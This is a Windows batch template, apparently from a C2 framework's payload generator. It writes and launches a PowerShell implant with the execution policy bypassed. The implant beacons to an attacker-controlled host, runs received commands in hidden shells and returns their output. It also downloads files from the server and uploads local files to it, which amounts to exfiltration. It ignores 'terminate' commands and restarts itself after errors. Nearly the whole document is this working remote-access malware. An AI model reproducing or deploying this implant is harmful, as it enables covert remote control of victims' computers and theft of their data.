@echo off
setlocal ENABLEDELAYEDEXPANSION
set "line={line}"
set "lhost={lhost}"
set "lport={lport}"
set "SOURCE_FILE=%line%.ps1"

(
echo $C2_URL = 'http://%lhost%:%lport%'
echo $CLIENT_ID = '%line%'
echo $USERNAME = '{username}'
echo $PASSWORD = '{password}'
echo $SLEEP = {sleep}
echo $MALEABLE = '{maleable}'
echo $USER_AGENT = '{useragent}'
echo $MAX_RETRIES = 5
echo $RETRY_DELAY = 5

echo function Global-Recover {
echo     if ($Error.Count -gt 0) {
echo         Write-Output "[RECOVER] Recuperándose de panic: $Error[0]"
echo         Start-Process -FilePath $MyInvocation.MyCommand.Path -ArgumentList $MyInvocation.UnboundArguments -NoNewWindow -Wait
echo         exit
echo     }
echo }

echo function Send-RequestWithRetry {
echo     param (
echo         [string]$url,
echo         [string]$method,
echo         [string]$body,
echo         [string]$filePath
echo     )
echo
echo     $lastErr = $null
echo     for ($attempt = 0; $attempt -lt $MAX_RETRIES; $attempt++) {
echo         if ($attempt -gt 0) {
echo             Start-Sleep -Seconds $RETRY_DELAY
echo         }
echo
echo         try {
echo             $resp = Send-Request -url $url -method $method -body $body -filePath $filePath
echo             return $resp
echo         } catch {
echo             $lastErr = $_.Exception.Message
echo             Write-Output "[RETRY] Intento $($attempt + 1) de $MAX_RETRIES fallido: $lastErr"
echo         }
echo     }
echo     throw $lastErr
echo }

echo function Send-Request {
echo     param (
echo         [string]$url,
echo         [string]$method,
echo         [string]$body,
echo         [string]$filePath
echo     )
echo
echo     trap { Global-Recover }
echo
echo     $client = New-Object System.Net.Http.HttpClient
echo     $client.Timeout = New-TimeSpan -Seconds 60
echo     $client.DefaultRequestHeaders.Authorization = New-Object System.Net.Http.Headers.AuthenticationHeaderValue "Basic", [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$USERNAME:$PASSWORD"))
echo     $client.DefaultRequestHeaders.UserAgent.ParseAdd($USER_AGENT)
echo
echo     if ($filePath -ne "") {
echo         $fileContent = [System.IO.File]::ReadAllBytes($filePath)
echo         $content = New-Object System.Net.Http.MultipartFormDataContent
echo         $content.Add(New-Object System.Net.Http.ByteArrayContent($fileContent), "file", [System.IO.Path]::GetFileName($filePath))
echo         $response = $client.PostAsync($url, $content).Result
echo     } else {
echo         $content = New-Object System.Net.Http.StringContent($body, [System.Text.Encoding]::UTF8, "application/json")
echo         $response = $client.SendAsync(New-Object System.Net.Http.HttpRequestMessage($method, $url) { Content = $content }).Result
echo     }
echo
echo     return $response
echo }

echo function Execute-CommandWithRetry {
echo     param (
echo         [string[]]$shellCommand,
echo         [string]$command
echo     )
echo
echo     $output = $null
echo     $lastErr = $null
echo     for ($attempt = 0; $attempt -lt $MAX_RETRIES; $attempt++) {
echo         if ($attempt -gt 0) {
echo             Start-Sleep -Seconds $RETRY_DELAY
echo         }
echo
echo         try {
echo             $output = Execute-Command -shellCommand $shellCommand -command $command
echo             return $output
echo         } catch {
echo             $lastErr = $_.Exception.Message
echo             Write-Output "[RETRY] Intento de ejecución $($attempt + 1) de $MAX_RETRIES fallido: $lastErr"
echo         }
echo     }
echo     throw $lastErr
echo }

echo function Execute-Command {
echo     param (
echo         [string[]]$shellCommand,
echo         [string]$command
echo     )
echo
echo     trap { Global-Recover }
echo
echo     $process = New-Object System.Diagnostics.Process
echo     $process.StartInfo.FileName = $shellCommand[0]
echo     $process.StartInfo.Arguments = "$($shellCommand[1]) $command"
echo     $process.StartInfo.RedirectStandardOutput = $true
echo     $process.StartInfo.RedirectStandardError = $true
echo     $process.StartInfo.UseShellExecute = $false
echo     $process.StartInfo.CreateNoWindow = $true
echo     $process.Start() | Out-Null
echo     $output = $process.StandardOutput.ReadToEnd()
echo     $error = $process.StandardError.ReadToEnd()
echo     $process.WaitForExit()
echo
echo     if ($process.ExitCode -ne 0) {
echo         throw "$error`n$output"
echo     }
echo
echo     return $output
echo }

echo function Get-ShellCommand {
echo     trap { Global-Recover }
echo
echo     if (Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") {
echo         return @("powershell.exe", "-Command")
echo     } elseif (Test-Path "C:\Windows\System32\cmd.exe") {
echo         return @("cmd.exe", "/C")
echo     } else {
echo         throw "No se encontró un shell compatible"
echo     }
echo }

echo function Main {
echo     trap { Global-Recover }
echo
echo     $shellCommand = Get-ShellCommand
echo     while ($true) {
echo         try {
echo             $ctx = New-Object System.Threading.CancellationTokenSource(New-TimeSpan -Seconds 180)
echo             $resp = Send-RequestWithRetry -url "$C2_URL$MALEABLE$CLIENT_ID" -method "GET" -body "" -filePath ""
echo             if ($resp -eq $null -or $resp.Content -eq $null) {
echo                 Write-Output "[ERROR] Respuesta vacía"
echo                 Start-Sleep -Seconds $SLEEP
echo                 continue
echo             }
echo
echo             $command = [System.Text.Encoding]::UTF8.GetString($resp.Content.ReadAsByteArrayAsync().Result)
echo
echo             switch -Wildcard ($command) {
echo                 "terminate" {
echo                     Write-Output "[INFO] Comando terminate recibido pero continuando operación"
echo                 }
echo                 "download:*" {
echo                     Handle-Download -command $command
echo                 }
echo                 "upload:*" {
echo                     Handle-Upload -command $command
echo                 }
echo                 default {
echo                     Handle-Command -command $command -shellCommand $shellCommand
echo                 }
echo             }
echo         } catch {
echo             Write-Output "[ERROR] Error en request principal: $_"
echo             Start-Sleep -Seconds $SLEEP
echo         }
echo
echo         Start-Sleep -Seconds $SLEEP
echo     }
echo }

echo function Handle-Download {
echo     param (
echo         [string]$command
echo     )
echo
echo     trap { Global-Recover }
echo
echo     $filePath = $command -replace "download:", ""
echo     $fileURL = "$C2_URL$MALEABLE/download/$filePath"
echo
echo     $resp = Send-RequestWithRetry -url $fileURL -method "GET" -body "" -filePath ""
echo     if ($resp -eq $null -or $resp.Content -eq $null) {
echo         Write-Output "[ERROR] Respuesta de descarga vacía"
echo         return
echo     }
echo
echo     $fileData = $resp.Content.ReadAsByteArrayAsync().Result
echo     [System.IO.File]::WriteAllBytes([System.IO.Path]::GetFileName($filePath), $fileData)
echo     Write-Output "[INFO] Archivo descargado: $filePath"
echo }

echo function Handle-Upload {
echo     param (
echo         [string]$command
echo     )
echo
echo     trap { Global-Recover }
echo
echo     $filePath = $command -replace "upload:", ""
echo     $resp = Send-RequestWithRetry -url "$C2_URL$MALEABLE/upload" -method "POST" -body "" -filePath $filePath
echo     if ($resp -ne $null) {
echo         if ($resp.StatusCode -eq [System.Net.HttpStatusCode]::OK) {
echo             Write-Output "[INFO] Archivo subido: $filePath"
echo         } else {
echo             Write-Output "[ERROR] Fallo en subida: $filePath (Status: $($resp.StatusCode))"
echo         }
echo     }
echo }

echo function Handle-Command {
echo     param (
echo         [string]$command,
echo         [string[]]$shellCommand
echo     )
echo
echo     trap { Global-Recover }
echo
echo     $output = Execute-CommandWithRetry -shellCommand $shellCommand -command $command
echo     $jsonData = @{
echo         output = $output
echo         client = $env:OS
echo         command = $command
echo     } | ConvertTo-Json
echo
echo     $resp = Send-RequestWithRetry -url "$C2_URL$MALEABLE$CLIENT_ID" -method "POST" -body $jsonData -filePath ""
echo     if ($resp -ne $null -and $resp.Content -ne $null) {
echo         $resp.Content.Dispose()
echo     }
echo }

echo # Iniciar el script
echo Main
) > "%SOURCE_FILE%"
powershell -ExecutionPolicy Bypass -File "%SOURCE_FILE%"
